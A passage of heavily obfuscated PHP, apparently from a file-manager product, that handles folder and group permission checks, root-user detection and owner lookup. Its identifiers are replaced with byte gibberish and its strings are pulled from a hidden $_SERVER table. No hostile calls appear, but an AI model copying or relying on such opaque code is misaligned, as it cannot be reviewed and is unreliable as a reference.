$Ó¢¬Öô[$Í¿‡Ï[551]] = $ÖõçÄÎ; $“û’±¾ú[] = $Ó¢¬Öô; $ÀËòì«Ë = 0; if ($È¦ÜĞĞ’[$Í¿‡Ï[201]] == SourceModel::TYPE_GROUP) { $ÀËòì«Ë = $—ñÃÃíí * 2; } if ($È¦ÜĞĞ’[$Í¿‡Ï[201]] == SourceModel::TYPE_USER) { $ÀËòì«Ë = $—ñÃÃíí; } if ($È¦ÜĞĞ’[$Í¿‡Ï[201]] == SourceModel::TYPE_USER && $È¦ÜĞĞ’[$Í¿‡Ï[580]] == $Í¿‡Ï[241]) { $ÀËòì«Ë = 0; } $ó¦»¤Ï[] = $ÖõçÄÎ[$Í¿‡Ï[498]] + $ÀËòì«Ë; } array_multisort($ó¦»¤Ï, SORT_DESC, $“û’±¾ú); return $“û’±¾ú; } public function getAllChildrenByUser($èƒ¾šş, $Ñ”ÄĞÊæ) { $ì»¹Şˆ =& $_SERVER[ü¢ÙÊñÛ]; $Ëû“†äá = Model($ì»¹Şˆ[608])->getInfo($Ñ”ÄĞÊæ); if (!$Ñ”ÄĞÊæ || !$èƒ¾šş || !$Ëû“†äá) { return array(); } $Âïºàß– = Model($ì»¹Şˆ[1410])->sourceInfo($èƒ¾šş); $¤›Æ§‚ = array(); $ãÉ„— = 1; if ($Âïºàß–[$ì»¹Şˆ[203]] == $ì»¹Şˆ[241] && $Âïºàß–[$ì»¹Şˆ[580]] != $ãÉ„— && $this->groupContainUser($Âïºàß–[$ì»¹Şˆ[580]], $Ñ”ÄĞÊæ)) { foreach ($Ëû“†äá[$ì»¹Şˆ[2151]] as $åıµÀ¡õ) { $«Ûµ‹í² = Model($ì»¹Şˆ[596])->getInfo($åıµÀ¡õ[$ì»¹Şˆ[1959]]); $ñ÷ú«ı¼ = Model($ì»¹Şˆ[608])->getInfoSimpleOuter($Ñ”ÄĞÊæ); $ñ÷ú«ı¼[$ì»¹Şˆ[551]] = $åıµÀ¡õ[$ì»¹Şˆ[498]]; if (Model($ì»¹Şˆ[582])->authCheckAction($åıµÀ¡õ[$ì»¹Şˆ[498]][$ì»¹Şˆ[498]], $ì»¹Şˆ[1980])) { continue; } $Íâ“ï–Ÿ = array($ì»¹Şˆ[42] => $ì»¹Şˆ[1282] . $«Ûµ‹í²[$ì»¹Şˆ[42]], $ì»¹Şˆ[204] => $«Ûµ‹í²[$ì»¹Şˆ[101]][$ì»¹Şˆ[204]], $ì»¹Şˆ[98] => KodIO::make($«Ûµ‹í²[$ì»¹Şˆ[101]][$ì»¹Şˆ[204]]), $ì»¹Şˆ[203] => $ì»¹Şˆ[241], $ì»¹Şˆ[201] => $ì»¹Şˆ[589], $ì»¹Şˆ[43] => $ì»¹Şˆ[630], $ì»¹Şˆ[593] => $«Ûµ‹í²[$ì»¹Şˆ[600]], $ì»¹Şˆ[1959] => $«Ûµ‹í²[$ì»¹Şˆ[1959]], $ì»¹Şˆ[597] => $«Ûµ‹í²[$ì»¹Şˆ[203]], $ì»¹Şˆ[2148] => array($ñ÷ú«ı¼)); $¤›Æ§‚[$Íâ“ï–Ÿ[$ì»¹Şˆ[204]]] = $Íâ“ï–Ÿ; } } $åÊœò¿ı = array(); $ºì„ØÀÇ = $this->getAllChildren($èƒ¾šş); foreach ($ºì„ØÀÇ as $«ƒ–¹î) { $ş–ßæóõ = !1; foreach ($«ƒ–¹î[$ì»¹Şˆ[2148]] as $ñ™ë­ï‚) { if ($ñ™ë­ï‚[$ì»¹Şˆ[1759]]) { if ($ñ™ë­ï‚[$ì»¹Şˆ[1759]] == $Ñ”ÄĞÊæ) { $ş–ßæóõ = !0; break; } } if ($ñ™ë­ï‚[$ì»¹Şˆ[1959]]) { if ($this->groupContainUser($ñ™ë­ï‚[$ì»¹Şˆ[1959]], $Ñ”ÄĞÊæ)) { $ş–ßæóõ = !0; break; } } } if ($ş–ßæóõ) { $åÊœò¿ı[] = $«ƒ–¹î; } $ÌÏı°¸ø = $«ƒ–¹î[$ì»¹Şˆ[204]]; if (isset($¤›Æ§‚[$ÌÏı°¸ø])) { $«ƒ–¹î[$ì»¹Şˆ[2148]][] = $¤›Æ§‚[$ÌÏı°¸ø][0]; $¤›Æ§‚[$ÌÏı°¸ø] = !1; } } $¤›Æ§‚ = array_filter(array_values($¤›Æ§‚)); $åÊœò¿ı = array_merge($¤›Æ§‚, $åÊœò¿ı); return $åÊœò¿ı; } public function setAllChildrenByUser($òĞĞ¼œ”, $ÎÏ¸²†º, $’Âêåœ”) { $ŞÂô¦³ù =& $_SERVER[ü¢ÙÊñÛ]; $ÓøÙëøÌ = $this->getAllChildrenByUser($òĞĞ¼œ”, $ÎÏ¸²†º); if (!$’Âêåœ” || !$ÓøÙëøÌ) { return !1; } foreach ($ÓøÙëøÌ as $®ïÒ…£™) { $ªºáê¢• = array(); foreach ($®ïÒ…£™[$ŞÂô¦³ù[2148]] as $ÙéÄÎ Ù) { $î´•‘É = $ÙéÄÎ Ù[$ŞÂô¦³ù[551]]; $‹•¨ÏíÒ = $ÙéÄÎ Ù[$ŞÂô¦³ù[1759]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $¶ß•›•’ = $ÙéÄÎ Ù[$ŞÂô¦³ù[1759]] ? $ÙéÄÎ Ù[$ŞÂô¦³ù[1759]] : $ÙéÄÎ Ù[$ŞÂô¦³ù[1959]]; if ($ÙéÄÎ Ù[$ŞÂô¦³ù[1759]] && $ÙéÄÎ Ù[$ŞÂô¦³ù[1759]] == $ÎÏ¸²†º) { continue; } $ªºáê¢•[] = array($ŞÂô¦³ù[204] => $®ïÒ…£™[$ŞÂô¦³ù[204]], $ŞÂô¦³ù[201] => $‹•¨ÏíÒ, $ŞÂô¦³ù[580] => intval($¶ß•›•’), $ŞÂô¦³ù[2067] => isset($î´•‘É[$ŞÂô¦³ù[486]]) ? intval($î´•‘É[$ŞÂô¦³ù[486]]) : 0, $ŞÂô¦³ù[2128] => isset($î´•‘É[$ŞÂô¦³ù[2128]]) ? intval($î´•‘É[$ŞÂô¦³ù[2128]]) : -1); } $ªºáê¢•[] = array($ŞÂô¦³ù[204] => $®ïÒ…£™[$ŞÂô¦³ù[204]], $ŞÂô¦³ù[201] => SourceModel::TYPE_USER, $ŞÂô¦³ù[580] => intval($ÎÏ¸²†º), $ŞÂô¦³ù[2067] => intval($’Âêåœ”), $ŞÂô¦³ù[2128] => -1); $this->where(array($ŞÂô¦³ù[502] => $®ïÒ…£™[$ŞÂô¦³ù[204]]))->delete(); $this->addAll($ªºáê¢•); } return !0; } public function get($Æ¡ıùŒè) { $Óû¸Ó˜˜ = $this->getSourceList(array($Æ¡ıùŒè), !0); return $Óû¸Ó˜˜[0]; } public function getSourceList($¹Ó¼®Éã, $ë‘Ö‰í¡ = false, $­ÜµÌ¬¨ = false) { $ˆÛÄú˜ =& $_SERVER[ü¢ÙÊñÛ]; if (!$¹Ó¼®Éã) { return array(); } $ë¢—»¾ì = Model($ˆÛÄú˜[1410]); if (!$ë‘Ö‰í¡ && count($¹Ó¼®Éã) == 1) { $ë‘Ö‰í¡ = array(); $ë‘Ö‰í¡[$¹Ó¼®Éã[0]] = $ë¢—»¾ì->sourceInfo($¹Ó¼®Éã[0]); } if (!$ë‘Ö‰í¡) { $íÍ›ü›û = array($ˆÛÄú˜[502] => array($ˆÛÄú˜[503], $¹Ó¼®Éã)); $ë‘Ö‰í¡ = $ë¢—»¾ì->field($ˆÛÄú˜[2152])->where($íÍ›ü›û)->select(); $ë‘Ö‰í¡ = array_to_keyvalue($ë‘Ö‰í¡, $ˆÛÄú˜[204]); } $øÎì¶­ = $¹Ó¼®Éã; foreach ($ë‘Ö‰í¡ as $ãú­Ç•ª => $—¶°ß×º) { $Á ´’” = $ë¢—»¾ì->parentLevelArray($—¶°ß×º[$ˆÛÄú˜[595]]); $øÎì¶­ = array_merge($øÎì¶­, array($ãú­Ç•ª), array_reverse($Á ´’”)); } $øÎì¶­ = array_values(array_unique($øÎì¶­)); if (!$øÎì¶­) { return array(); } $ Ö¤”ö = $this->sourceAuthSelect($øÎì¶­); $Õ–ÃÃÄï = array(); foreach ($øÎì¶­ as $üĞ°úº) { if (isset($ Ö¤”ö[$üĞ°úº])) { $Õ–ÃÃÄï[$üĞ°úº] = $ Ö¤”ö[$üĞ°úº]; } } $ùÚ”á³Å = $this->userIsRoot($­ÜµÌ¬¨); $ƒñ›¹®Ò = AuthModel::authAll(); $’Ú‹•°Š = array($ˆÛÄú˜[499] => $ƒñ›¹®Ò, $ˆÛÄú˜[2153] => array($ˆÛÄú˜[504] => 0, $ˆÛÄú˜[1965] => $ƒñ›¹®Ò, $ˆÛÄú˜[505] => LNG($ˆÛÄú˜[2154]), $ˆÛÄú˜[1982] => $ˆÛÄú˜[2155])); $ÜƒÖ­ˆ´ = array(); foreach ($ë‘Ö‰í¡ as $üĞ°úº => $©üõÅû€) { if ($ùÚ”á³Å && $GLOBALS[$ˆÛÄú˜[16]][$ˆÛÄú˜[1978]]) { $ÜƒÖ­ˆ´[$üĞ°úº] = $’Ú‹•°Š; continue; } $ÜƒÖ­ˆ´[$üĞ°úº] = $this->makeSourceAuth($©üõÅû€, $Õ–ÃÃÄï, $­ÜµÌ¬¨); } return $ÜƒÖ­ˆ´; } public function authDeepCheck($«£ÂÌ²ï, $¤ßö™Ãµ = false) { $ÀÛã‡Æ„ =& $_SERVER[ü¢ÙÊñÛ]; $¤ßö™Ãµ = $¤ßö™Ãµ ? $¤ßö™Ãµ : USER_ID; $şÕ¼ÍÜï = $this->makeAuthDeep($¤ßö™Ãµ); if (!in_array($«£ÂÌ²ï, $şÕ¼ÍÜï[$ÀÛã‡Æ„[2156]])) { return !1; } $­İííî‰ = array(); foreach ($şÕ¼ÍÜï[$ÀÛã‡Æ„[2157]] as $ öçÆ¿ß => $­‘µÍ••) { if (!in_array($«£ÂÌ²ï, $­‘µÍ••)) { continue; } $­İííî‰[] = $ öçÆ¿ß; } if (!$­İííî‰) { return !1; } $ÒŞŸÍúˆ = $­İííî‰ ? $­İííî‰[0] : $«£ÂÌ²ï; return array($ÀÛã‡Æ„[499] => -1, $ÀÛã‡Æ„[551] => array($ÀÛã‡Æ„[504] => $ÀÛã‡Æ„[1262], $ÀÛã‡Æ„[1965] => $ÀÛã‡Æ„[241], $ÀÛã‡Æ„[505] => LNG($ÀÛã‡Æ„[2158]), $ÀÛã‡Æ„[1982] => $ÀÛã‡Æ„[2159]), $ÀÛã‡Æ„[2160] => LNG($ÀÛã‡Æ„[2161]), $ÀÛã‡Æ„[2162] => $this->sourceAuthInfo($ÒŞŸÍúˆ)); } protected function makeAuthDeep($×‚¢ã¿ = false) { $Ç™‰ˆ™Ç =& $_SERVER[ü¢ÙÊñÛ]; static $•§ó˜üà = array(); $×‚¢ã¿ = $×‚¢ã¿ ? $×‚¢ã¿ : USER_ID; if (isset($•§ó˜üà[$×‚¢ã¿])) { return $•§ó˜üà[$×‚¢ã¿]; } $ª³Ú‹ªÂ = Model($Ç™‰ˆ™Ç[2163])->listData(); $²¤ÉÚÛ = array(); foreach ($ª³Ú‹ªÂ as $Úü—êåŠ) { if ($Úü—êåŠ[$Ç™‰ˆ™Ç[498]] == 0 && $Úü—êåŠ[$Ç™‰ˆ™Ç[1981]] == $Ç™‰ˆ™Ç[102]) { $²¤ÉÚÛ[] = $Úü—êåŠ[$Ç™‰ˆ™Ç[486]]; } } $·³¦¨ôÍ = $this->userGroupParents($×‚¢ã¿); $‰óÂÙì² = array($Ç™‰ˆ™Ç[201] => SourceModel::TYPE_USER, $Ç™‰ˆ™Ç[580] => $×‚¢ã¿); if ($·³¦¨ôÍ) { $‰óÂÙì² = array(array($Ç™‰ˆ™Ç[201] => SourceModel::TYPE_USER, $Ç™‰ˆ™Ç[580] => $×‚¢ã¿), array($Ç™‰ˆ™Ç[201] => SourceModel::TYPE_GROUP, $Ç™‰ˆ™Ç[580] => array($Ç™‰ˆ™Ç[503], $·³¦¨ôÍ)), $Ç™‰ˆ™Ç[1066] => $Ç™‰ˆ™Ç[2061]); } $ëµİ¿Ö˜ = $this->field($Ç™‰ˆ™Ç[2164])->where($‰óÂÙì²)->select(); $»ÒäÓª = array(); $Ñ•»ªşæ = array_to_keyvalue_group($ëµİ¿Ö˜, $Ç™‰ˆ™Ç[204]); foreach ($Ñ•»ªşæ as $Á¡Ò‘Ü => $‚¦‰¢‹) { $—¡›İ = $this->authArrayCheck($‚¦‰¢‹, $×‚¢ã¿); if ($—¡›İ[$Ç™‰ˆ™Ç[499]] > 0) { $»ÒäÓª[] = $Á¡Ò‘Ü . $Ç™‰ˆ™Ç[22]; } } if ($·³¦¨ôÍ) { $¤ö–ƒïÜ = Model($Ç™‰ˆ™Ç[596]); foreach ($·³¦¨ôÍ as $™€Ô¾Êñ) { $¶òğİ› = $¤ö–ƒïÜ->getInfo($™€Ô¾Êñ); if (!$¶òğİ› || !is_array($¶òğİ›[$Ç™‰ˆ™Ç[101]])) { continue; } $»ÒäÓª[] = $¶òğİ›[$Ç™‰ˆ™Ç[101]][$Ç™‰ˆ™Ç[204]]; } } $Ì¢†¨Ï¥ = array(); $«°¬¯Éä = $·³¦¨ôÍ; $ÆŒÜø = Model($Ç™‰ˆ™Ç[1410]); $¤ö–ƒïÜ = Model($Ç™‰ˆ™Ç[596]); $ş¡±Ø— = array(); $ÖêÔ«ĞÜ = array(); $áÓ¥ì”° = array(); $Ë˜¡õ = array(); if ($»ÒäÓª) { $ÑšÈš£ = $ÆŒÜø->where(array($Ç™‰ˆ™Ç[204] => array($Ç™‰ˆ™Ç[503], $»ÒäÓª)))->select(); foreach ($ÑšÈš£ as $‰ù¼ıÉ) { $—¤å… = $ÆŒÜø->parentLevelArray($‰ù¼ıÉ[$Ç™‰ˆ™Ç[595]]); $Ì¢†¨Ï¥ = array_merge($Ì¢†¨Ï¥, $—¤å…); $«°¬¯Éä[] = $‰ù¼ıÉ[$Ç™‰ˆ™Ç[580]]; $ş¡±Ø—[$‰ù¼ıÉ[$Ç™‰ˆ™Ç[204]]] = $—¤å…; $ÖêÔ«ĞÜ[$‰ù¼ıÉ[$Ç™‰ˆ™Ç[204]]] = $‰ù¼ıÉ[$Ç™‰ˆ™Ç[580]]; } } $«°¬¯Éä = array_values(array_unique($«°¬¯Éä)); $ºáÔ×»Á = $«°¬¯Éä; foreach ($ºáÔ×»Á as $™€Ô¾Êñ) { $¶òğİ› = $¤ö–ƒïÜ->getInfo($™€Ô¾Êñ); $—¤å… = $ÆŒÜø->parentLevelArray($¶òğİ›[$Ç™‰ˆ™Ç[595]]); $«°¬¯Éä = array_merge($«°¬¯Éä, $—¤å…); } $«°¬¯Éä = array_values(array_unique($«°¬¯Éä)); foreach ($«°¬¯Éä as $™€Ô¾Êñ) { $¶òğİ› = $¤ö–ƒïÜ->getInfo($™€Ô¾Êñ); $Ì¢†¨Ï¥[] = $¶òğİ›[$Ç™‰ˆ™Ç[101]][$Ç™‰ˆ™Ç[204]]; $áÓ¥ì”°[$™€Ô¾Êñ] = $¶òğİ›[$Ç™‰ˆ™Ç[101]][$Ç™‰ˆ™Ç[204]]; $Ë˜¡õ[$™€Ô¾Êñ] = $ÆŒÜø->parentLevelArray($¶òğİ›[$Ç™‰ˆ™Ç[595]]); } foreach ($ş¡±Ø— as $„±«Æƒš => $àãˆÏßı) { $›‹Ì½¬¥ = $ÖêÔ«ĞÜ[$„±«Æƒš]; if (!$›‹Ì½¬¥ || !$áÓ¥ì”°[$›‹Ì½¬¥]) { continue; } $Ôš¦·ò = array(); foreach ($Ë˜¡õ[$›‹Ì½¬¥] as $™€Ô¾Êñ) { $Ôš¦·ò[] = $áÓ¥ì”°[$™€Ô¾Êñ]; } $ş¡±Ø—[$„±«Æƒš] = array_merge($Ôš¦·ò, $àãˆÏßı); } $Ì¢†¨Ï¥ = array_values(array_unique($Ì¢†¨Ï¥)); $ûã°İÎ‘ = array($Ç™‰ˆ™Ç[2156] => $Ì¢†¨Ï¥, $Ç™‰ˆ™Ç[2157] => $ş¡±Ø—); $•§ó˜üà[$×‚¢ã¿] = $ûã°İÎ‘; return $ûã°İÎ‘; } private function makeSourceAuth($ıÖƒ‹¿, $†íúŸş¶, $Ò¦µÉ´ = false) { $„Á´¡¡ú =& $_SERVER[ü¢ÙÊñÛ]; $øíåíûŠ = $„Á´¡¡ú[102]; $ñôàÙ¢ = $ıÖƒ‹¿[$„Á´¡¡ú[580]]; $äü ıè˜ = $ıÖƒ‹¿[$„Á´¡¡ú[201]] == SourceModel::TYPE_GROUP; $ÑÚÓğÏ™ = $äü ıè˜ ? $this->groupRootAuth($ñôàÙ¢, $Ò¦µÉ´) : !1; if ($ÑÚÓğÏ™ && Model($„Á´¡¡ú[582])->authCheckAction($ÑÚÓğÏ™[$„Á´¡¡ú[498]], $„Á´¡¡ú[1980])) { return $this->groupAuthInfo($ÑÚÓğÏ™, $ñôàÙ¢); } $ùßüŒÔš = Model($„Á´¡¡ú[1410])->parentLevelArray($ıÖƒ‹¿[$„Á´¡¡ú[595]]); $ùßüŒÔš = array_merge(array($ıÖƒ‹¿[$„Á´¡¡ú[204]]), array_reverse($ùßüŒÔš)); $ Ôˆ¢›é = !1; foreach ($ùßüŒÔš as $èéöƒšö) { if (!isset($†íúŸş¶[$èéöƒšö])) { continue; } $¤ıü‡¿ = $this->authMake($†íúŸş¶[$èéöƒšö], $Ò¦µÉ´); if ($¤ıü‡¿[$„Á´¡¡ú[551]]) { $ Ôˆ¢›é = $¤ıü‡¿; break; } } if (!$äü ıè˜) { return $ Ôˆ¢›é; } if (!$ Ôˆ¢›é && $ÑÚÓğÏ™) { $ Ôˆ¢›é = $this->groupAuthInfo($ÑÚÓğÏ™, $ñôàÙ¢); } if (!$ Ôˆ¢›é) { $ŒÈ³Ò§ = Model($„Á´¡¡ú[596])->getInfo($ñôàÙ¢); $®Õıëó = explode($„Á´¡¡ú[60], trim($ŒÈ³Ò§[$„Á´¡¡ú[595]], $„Á´¡¡ú[60])); $®Õıëó = array_reverse($®Õıëó); foreach ($®Õıëó as $ €”Î¬ë) { if ($ €”Î¬ë == $„Á´¡¡ú[241] || $ €”Î¬ë == $øíåíûŠ) { continue; } $ïË¹Ë÷ = $this->groupRootAuth($ €”Î¬ë, $Ò¦µÉ´); if (!$ïË¹Ë÷) { continue; } $ Ôˆ¢›é = $this->groupAuthInfo($ïË¹Ë÷, $ €”Î¬ë); break; } } if (!$ Ôˆ¢›é || $ Ôˆ¢›é[$„Á´¡¡ú[499]] <= 0) { $Ãß±–‘Ë = $this->authDeepCheck($ıÖƒ‹¿[$„Á´¡¡ú[204]], $Ò¦µÉ´); if ($Ãß±–‘Ë) { $ Ôˆ¢›é = $Ãß±–‘Ë; } } return $ Ôˆ¢›é; } private function userIsRoot($…¾¿”êø = false) { $é ±å =& $_SERVER[ü¢ÙÊñÛ]; if (!$…¾¿”êø && KodUser::isRoot()) { return !0; } $ÆÙ„â´Ñ = Model($é ±å[608])->getInfo($…¾¿”êø); $İŸä·Òş = Model($é ±å[2165])->listData($ÆÙ„â´Ñ[$é ±å[2166]]); if ($İŸä·Òş && $İŸä·Òş[$é ±å[586]][$é ±å[2167]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ªùŞÕ³È) { $ğçûñÆé =& $_SERVER[ü¢ÙÊñÛ]; $Ñ¨–õ¡à = Model($ğçûñÆé[1410]); $†˜‚ÔÕ = $Ñ¨–õ¡à->sourceInfo($ªùŞÕ³È); if (!$†˜‚ÔÕ) { return !1; } $Ñ¨–õ¡à->groupPathDisplay($†˜‚ÔÕ); $¾÷ƒÏÁ = array($†˜‚ÔÕ); $¾÷ƒÏÁ = $Ñ¨–õ¡à->_listAppendPath($¾÷ƒÏÁ); $†˜‚ÔÕ = $¾÷ƒÏÁ[0]; $şœã¯÷Í = $†˜‚ÔÕ[$ğçûñÆé[593]]; if (isset($†˜‚ÔÕ[$ğçûñÆé[601]])) { $‚ñ†‹²Ü = explode($ğçûñÆé[18], trim($†˜‚ÔÕ[$ğçûñÆé[593]], $ğçûñÆé[18])); array_shift($‚ñ†‹²Ü); $şœã¯÷Í = $†˜‚ÔÕ[$ğçûñÆé[599]] . $ğçûñÆé[2168] . implode($ğçûñÆé[18], $‚ñ†‹²Ü); } return array($ğçûñÆé[505] => $†˜‚ÔÕ[$ğçûñÆé[42]], $ğçûñÆé[98] => KodIO::make($†˜‚ÔÕ[$ğçûñÆé[204]]), $ğçûñÆé[2169] => $şœã¯÷Í); } private function groupAuthInfo($Ú²‚··, $›İ‘Å‡) { $Û¸’Ùå =& $_SERVER[ü¢ÙÊñÛ]; $­ÂªùÀ— = Model($Û¸’Ùå[596])->getInfo($›İ‘Å‡); return array($Û¸’Ùå[2170] => intval($Ú²‚··[$Û¸’Ùå[498]]), $Û¸’Ùå[2153] => $Ú²‚··, $Û¸’Ùå[2171] => LNG($Û¸’Ùå[2172]), $Û¸’Ùå[2162] => array($Û¸’Ùå[505] => $­ÂªùÀ—[$Û¸’Ùå[42]], $Û¸’Ùå[98] => KodIO::make($­ÂªùÀ—[$Û¸’Ùå[101]][$Û¸’Ùå[204]]), $Û¸’Ùå[2169] => $­ÂªùÀ—[$Û¸’Ùå[600]])); } protected function groupRootAuth($ÔÔé µ‡, $ÄÀ§şæí = false) { $å°€ÜöÁ =& $_SERVER[ü¢ÙÊñÛ]; $ÄÀ§şæí = $ÄÀ§şæí ? $ÄÀ§şæí : USER_ID; $‰—¼Á× = $ÄÀ§şæí . $å°€ÜöÁ[2173] . $ÔÔé µ‡; static $üîÁäÄ• = array(); if (isset($üîÁäÄ•[$‰—¼Á×])) { return $üîÁäÄ•[$‰—¼Á×]; } $’ƒĞ£Ç… = Model($å°€ÜöÁ[596])->getInfo($ÔÔé µ‡); $Ä·›í€ = $this->userGroupList($ÄÀ§şæí); $Õ¡°›®ú = isset($Ä·›í€[$ÔÔé µ‡]) ? $Ä·›í€[$ÔÔé µ‡][$å°€ÜöÁ[498]] : !1; if ($Õ¡°›®ú && Model($å°€ÜöÁ[582])->authCheckAction($Õ¡°›®ú[$å°€ÜöÁ[498]], $å°€ÜöÁ[1980])) { $üîÁäÄ•[$‰—¼Á×] = $Õ¡°›®ú; return $Õ¡°›®ú; } $ğÀ—¬¾ë = $this->sourceAuthSelect($’ƒĞ£Ç…[$å°€ÜöÁ[101]][$å°€ÜöÁ[204]]); $¡¯ƒ—î = $ğÀ—¬¾ë ? $this->authMake($ğÀ—¬¾ë, $ÄÀ§şæí) : !1; $îŠºŸƒ = $¡¯ƒ—î ? $¡¯ƒ—î[$å°€ÜöÁ[551]] : !1; $üîÁäÄ•[$‰—¼Á×] = $îŠºŸƒ ? $îŠºŸƒ : $Õ¡°›®ú; return $üîÁäÄ•[$‰—¼Á×]; } public function authOwnerApply($‘‚üùûá) { $Šªëß„ü =& $_SERVER[ü¢ÙÊñÛ]; if (empty($‘‚üùûá[$Šªëß„ü[498]]) || isset($‘‚üùûá[$Šªëß„ü[2174]]) && $‘‚üùûá[$Šªëß„ü[2174]]) { return $‘‚üùûá; } if (AuthModel::authCheckRoot($‘‚üùûá[$Šªëß„ü[498]][$Šªëß„ü[499]])) { return $‘‚üùûá; } $½ÄßŒâŠ = Model($Šªëß„ü[1410])->parentLevelArray($‘‚üùûá[$Šªëß„ü[595]]); $½ÄßŒâŠ = array_merge(array($‘‚üùûá[$Šªëß„ü[204]]), array_reverse($½ÄßŒâŠ)); $óö¯˜Î· = $this->sourceAuthSelect($½ÄßŒâŠ); $ÄÌÄÁ¦İ = array(); $®‚©ØÀ» = array(); foreach ($óö¯˜Î· as $©à•â—Ï => $ß•Ì·«¥) { $­ßÖ«†… = $this->authFolderOwnerUser($ß•Ì·«¥); $ÄÌÄÁ¦İ[$©à•â—Ï] = $­ßÖ«†…; $®‚©ØÀ» = array_merge($®‚©ØÀ», $­ßÖ«†…[$Šªëß„ü[676]]); if ($­ßÖ«†…[$Šªëß„ü[2175]]) { break; } } if (count($®‚©ØÀ») == 0) { $®‚©ØÀ» = $this->authFolderOwnerGroup($‘‚üùûá[$Šªëß„ü[580]]); } $®‚©ØÀ» = array_unique($®‚©ØÀ»); if (AuthModel::authCheckRoot($‘‚üùûá[$Šªëß„ü[498]][$Šªëß„ü[499]])) { $®‚©ØÀ»[] = USER_ID; } $‘‚üùûá[$Šªëß„ü[498]][$Šªëß„ü[2176]] = Model($Šªëß„ü[588])->userListInfo($®‚©ØÀ»); return $‘‚üùûá; } private function authFolderOwnerGroup($ñëÒ¢æŞ) { $¡æó°Ú =& $_SERVER[ü¢ÙÊñÛ]; $×ö¯Ü² = Model($¡æó°Ú[2053])->where(array($¡æó°Ú[1959] => $ñëÒ¢æŞ))->select(); $ÎçÃ¨ù = array(); if (!$×ö¯Ü²) { return $ÎçÃ¨ù; } foreach ($×ö¯Ü² as $€¾»ƒõá) { $Ñ²™¬ã· = $this->authInfo($€¾»ƒõá); if (AuthModel::authCheckRoot($Ñ²™¬ã·[$¡æó°Ú[498]])) { $ÎçÃ¨ù[] = $€¾»ƒõá[$¡æó°Ú[1759]]; } } return $ÎçÃ¨ù; } private function authFolderOwnerUser($ê¯‡…Ù) { $Û‘¹©ùœ =& $_SERVER[ü¢ÙÊñÛ]; $ì”ô×ßÃ = array(); $œ“—»ÔŠ = !1; foreach ($ê¯‡…Ù as $ìÓßÜ¸‚) { $¾ÎäÉ = $this->authInfo($ìÓßÜ¸‚); if ($ìÓßÜ¸‚[$Û‘¹©ùœ[580]] == $Û‘¹©ùœ[241]) { $œ“—»ÔŠ = !0; } if ($ìÓßÜ¸‚[$Û‘¹©ùœ[201]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¾ÎäÉ[$Û‘¹©ùœ[498]])) { $ì”ô×ßÃ[] = $ìÓßÜ¸‚[$Û‘¹©ùœ[580]]; } } } return array($Û‘¹©ùœ[676] => $ì”ô×ßÃ, $Û‘¹©ùœ[2175] => $œ“—»ÔŠ); } public function authMake($Õ¯ÎÏ¸, $ëÈÅ¸ñ = false) { $”–¬í”Ÿ =& $_SERVER[ü¢ÙÊñÛ]; $¦Â¹ä¦ = $this->authArrayCheck($Õ¯ÎÏ¸, $ëÈÅ¸ñ); if ($¦Â¹ä¦[$”–¬í”Ÿ[2177]]) { $¦Â¹ä¦[$”–¬í”Ÿ[2177]] = $this->sourceAuthInfo($¦Â¹ä¦[$”–¬í”Ÿ[2177]]); } return $¦Â¹ä¦; } public function authArrayCheck($Î¨•¿¼, $üûÒı² = false) { $â¯»ä÷ =& $_SERVER[ü¢ÙÊñÛ]; if (!$Î¨•¿¼) { return array($â¯»ä÷[499] => 0, $â¯»ä÷[551] => !1); } $üûÒı² = $üûÒı² ? $üûÒı² : USER_ID; $ŸÊÀÌ = 0; $Ä£ïğÄÑ = 0; $ÔêÖ‚ñï = 0; $ÃÇĞƒÜü = 0; $æª²Ä²“ = 0; $ƒ¸‡ôøÇ = 0; $êˆ­÷½ı = 1000; $®áÒ¬ÊÊ = 0; $ÒÇƒ¦Ä¢ = 0; $ê‹ÁÀ®¹ = 0; $¬ïì‘† = 0; $Æ„óæ— = array($â¯»ä÷[204] => 0); foreach ($Î¨•¿¼ as $Æ„óæ—) { $¥Ü”ñá = $this->authInfo($Æ„óæ—); if (!$¥Ü”ñá) { continue; } $¦ÆÉò÷ü = $Æ„óæ—[$â¯»ä÷[580]]; $óÑ¦Ö = intval($¥Ü”ñá[$â¯»ä÷[498]]); if ($Æ„óæ—[$â¯»ä÷[201]] == SourceModel::TYPE_USER && $¦ÆÉò÷ü == $üûÒı²) { $ŸÊÀÌ = !0; $ÔêÖ‚ñï = $¥Ü”ñá; $Ä£ïğÄÑ = $óÑ¦Ö; } else { if ($Æ„óæ—[$â¯»ä÷[201]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¦ÆÉò÷ü, $üûÒı²)) { $ÃÇĞƒÜü = !0; $´î·£¥ñ = $this->groupStepToUserGroup($¦ÆÉò÷ü, $üûÒı²); if ($´î·£¥ñ < $êˆ­÷½ı) { $êˆ­÷½ı = $´î·£¥ñ; $æª²Ä²“ = $óÑ¦Ö; $ƒ¸‡ôøÇ = $¥Ü”ñá; $®áÒ¬ÊÊ = $¦ÆÉò÷ü; } if ($´î·£¥ñ == $êˆ­÷½ı && $óÑ¦Ö >= $æª²Ä²“) { $æª²Ä²“ = $óÑ¦Ö; $ƒ¸‡ôøÇ = $¥Ü”ñá; $®áÒ¬ÊÊ = $¦ÆÉò÷ü; } } else { if ($¦ÆÉò÷ü == $â¯»ä÷[241]) { $ÒÇƒ¦Ä¢ = !0; $¬ïì‘† = $¥Ü”ñá; $ê‹ÁÀ®¹ = $óÑ¦Ö; } } } } if ($ŸÊÀÌ) { $ÀÕøÃ×ü = $Ä£ïğÄÑ; $¥Ü”ñá = $ÔêÖ‚ñï; $ïúğ‚‚§ = LNG($â¯»ä÷[2178]); } else { if ($ÃÇĞƒÜü) { $ÀÕøÃ×ü = $æª²Ä²“; $¥Ü”ñá = $ƒ¸‡ôøÇ; $¸ÏŞ£Ñ« = Model($â¯»ä÷[596])->getInfo($®áÒ¬ÊÊ); $ïúğ‚‚§ = $â¯»ä÷[187] . $¸ÏŞ£Ñ«[$â¯»ä÷[600]] . $â¯»ä÷[2179] . LNG($â¯»ä÷[2180]); } else { if ($ÒÇƒ¦Ä¢) { $ÀÕøÃ×ü = $ê‹ÁÀ®¹; $¥Ü”ñá = $¬ïì‘†; $ïúğ‚‚§ = LNG($â¯»ä÷[2150]); } else { $ÀÕøÃ×ü = 0; $¥Ü”ñá = !1; $ïúğ‚‚§ = $â¯»ä÷[22]; } } } $ÉŠ½ıÛ¶ = 